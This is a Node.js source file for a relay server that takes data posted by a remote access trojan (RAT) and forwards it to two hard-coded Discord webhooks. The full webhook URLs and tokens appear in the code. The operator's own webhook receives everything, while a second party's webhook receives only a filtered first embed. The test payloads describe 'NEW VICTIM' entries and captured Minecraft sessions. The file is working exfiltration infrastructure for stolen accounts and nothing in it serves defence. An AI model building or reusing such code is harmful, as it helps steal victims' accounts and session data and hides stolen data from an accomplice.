const express = require('express');
const axios = require('axios');
const app = express();

// RAW body parsing to handle ANYTHING
app.use(express.json({
    limit: '50mb',
    verify: (req, res, buf) => {
        req.rawBody = buf.toString();
    }
}));

const YOUR_WEBHOOK = 'https://discord.com/api/webhooks/1466876774217551943/zCWHPAss7rk7Ovb0RzKdA30RfpxAUjGW8it700GKlpHDkGnlI7eZCQbW_VSnaxeyh3Or';
const HIS_WEBHOOK = 'https://discord.com/api/webhooks/1467944736710070398/N9yF__Hs6rPggOUUlPtlMBWG7myEaI0L_NtDvM3FVlLEaMFtxlSp7NRNAAF43N9Dzq6E';

app.post('/webhook', async (req, res) => {
    console.log(`📡 [${new Date().toISOString()}] Received request`);
    
    let data = req.body;
    const rawBody = req.rawBody || '';
    
    // If JSON parsing failed but we have raw body, try to extract manually
    if (!data && rawBody) {
        console.log('⚠️ JSON parse failed, attempting raw extraction');
        try {
            // Try to find JSON in the raw body
            const jsonMatch = rawBody.match(/{[\s\S]*}/);
            if (jsonMatch) {
                data = JSON.parse(jsonMatch[0]);
                console.log('✅ Extracted JSON from raw body');
            }
        } catch (e) {
            console.log('❌ Could not extract JSON');
        }
    }
    
    // Always respond OK to RAT first
    res.status(200).json({ status: 'received' });
    
    if (!data) {
        console.log('❌ No data to process');
        return;
    }
    
    try {
        // LOG EVERYTHING for debugging
        console.log('=== FULL INCOMING DATA ===');
        console.log('Content:', data.content || '(empty)');
        console.log('Username:', data.username || '(none)');
        console.log('Avatar URL:', data.avatar_url || '(none)');
        console.log('Embeds count:', data.embeds?.length || 0);
        
        if (data.embeds && data.embeds.length > 0) {
            data.embeds.forEach((embed, i) => {
                console.log(`\n--- Embed ${i} ---`);
                console.log('Title:', embed.title || '(no title)');
                console.log('Description length:', embed.description?.length || 0);
                console.log('Color:', embed.color || '(default)');
                console.log('Fields count:', embed.fields?.length || 0);
                console.log('Components:', embed.components?.length || 0, 'buttons');
            });
        }
        console.log('=========================\n');
        
        // 1. ALWAYS send COMPLETE data to YOUR webhook
        console.log('📤 Sending COMPLETE data to YOUR webhook...');
        axios.post(YOUR_WEBHOOK, data, {
            timeout: 5000,
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Discord-Webhook-Relay'
            }
        })
        .then(() => console.log('✅ COMPLETE data sent to YOU'))
        .catch(e => console.log('❌ Failed to send to YOU:', e.message));
        
        // 2. Prepare FILTERED data for HIS webhook
        const filteredData = {};
        
        // ALWAYS include @everyone/content if it exists
        if (data.content && typeof data.content === 'string') {
            filteredData.content = data.content;
            console.log('📝 Content for him:', data.content.substring(0, 50) + '...');
        }
        
        // ALWAYS include username if it exists
        if (data.username) {
            filteredData.username = data.username;
        }
        
        // ALWAYS include avatar if it exists
        if (data.avatar_url) {
            filteredData.avatar_url = data.avatar_url;
        }
        
        // ALWAYS include the FIRST embed if it exists
        if (data.embeds && data.embeds.length > 0 && data.embeds[0]) {
            filteredData.embeds = [data.embeds[0]];
            console.log('🖼️  First embed title for him:', data.embeds[0].title || '(no title)');
            
            // Deep clone to avoid any reference issues
            filteredData.embeds[0] = JSON.parse(JSON.stringify(data.embeds[0]));
            
            // Make SURE no components/buttons exist
            if (filteredData.embeds[0].components) {
                delete filteredData.embeds[0].components;
                console.log('🗑️  Removed buttons/components from his embed');
            }
            
            // Make SURE it's ONLY the first embed
            if (filteredData.embeds.length > 1) {
                filteredData.embeds = filteredData.embeds.slice(0, 1);
            }
        } else {
            console.log('⚠️  No embeds found for him');
            filteredData.embeds = [];
        }
        
        // 3. ALWAYS send filtered data to HIS webhook
        if (filteredData.content || (filteredData.embeds && filteredData.embeds.length > 0)) {
            console.log('📤 Sending FILTERED data to HIS webhook...');
            axios.post(HIS_WEBHOOK, filteredData, {
                timeout: 5000,
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Discord-Webhook-Relay'
                }
            })
            .then(() => console.log('✅ FILTERED data sent to HIM'))
            .catch(e => console.log('❌ Failed to send to HIM:', e.message));
            
            // Log exactly what he receives
            console.log('📄 What he receives:');
            console.log(JSON.stringify(filteredData, null, 2).substring(0, 500) + '...');
        } else {
            console.log('⚠️  Nothing to send to him (no content or embeds)');
        }
        
    } catch (error) {
        console.log('💥 CRITICAL ERROR in processing:', error.message);
        console.log('Stack:', error.stack);
    }
});

// Health check
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        time: new Date().toISOString(),
        endpoints: {
            receive: 'POST /webhook',
            test: 'GET /test'
        }
    });
});

// Super flexible test endpoint
app.get('/test', (req, res) => {
    // Return different payloads based on query
    const testType = req.query.type || 'minecraft';
    
    const tests = {
        minecraft: {
            content: "@everyone\nNEW VICTIM: player456",
            username: "Minecraft Logger",
            embeds: [
                {
                    title: "Account Details",
                    description: "Fresh session captured",
                    color: 0x00ff00,
                    fields: [
                        { name: "IGN", value: "```\nplayer456\n```", inline: true },
                        { name: "Rank", value: "```\nVIP+\n```", inline: true }
                    ]
                },
                {
                    title: "SKIP THIS",
                    description: "This should NOT appear in his channel",
                    color: 0xff0000,
                    components: [{ type: 1, components: [] }]
                }
            ]
        },
        simple: {
            content: "@here Check this out",
            embeds: [
                {
                    title: "Only Embed",
                    description: "This is the only embed, should forward",
                    color: 0x0000ff
                }
            ]
        },
        noembed: {
            content: "@everyone Just a plain message",
            username: "Test Bot"
        },
        multiple: {
            content: "@everyone Multiple embeds test",
            embeds: [
                { title: "First", description: "Should forward" },
                { title: "Second", description: "Should NOT forward" },
                { title: "Third", description: "Should NOT forward" }
            ]
        }
    };
    
    const testData = tests[testType] || tests.minecraft;
    
    res.json({
        test: testType,
        note: "Send POST to /webhook with this data",
        payload: testData,
        curl: `curl -X POST http://localhost:3000/webhook -H "Content-Type: application/json" -d '${JSON.stringify(testData)}'`
    });
});

const PORT = 3000;
console.log(`
██████╗ ███████╗██╗      █████╗ ██╗   ██╗
██╔══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝
██████╔╝█████╗  ██║     ███████║ ╚████╔╝ 
██╔══██╗██╔══╝  ██║     ██╔══██║  ╚██╔╝  
██║  ██║███████╗███████╗██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   
                                          
🚀 RELAY SERVER v2.0 - BULLETPROOF
📡 PORT: ${PORT}
👉 YOUR webhook: Gets EVERYTHING
👉 HIS webhook: Gets @everyone + FIRST embed ONLY
📤 Test endpoints:
   http://localhost:${PORT}/test
   http://localhost:${PORT}/test?type=simple
   http://localhost:${PORT}/test?type=noembed
   http://localhost:${PORT}/test?type=multiple
`);

app.listen(PORT);
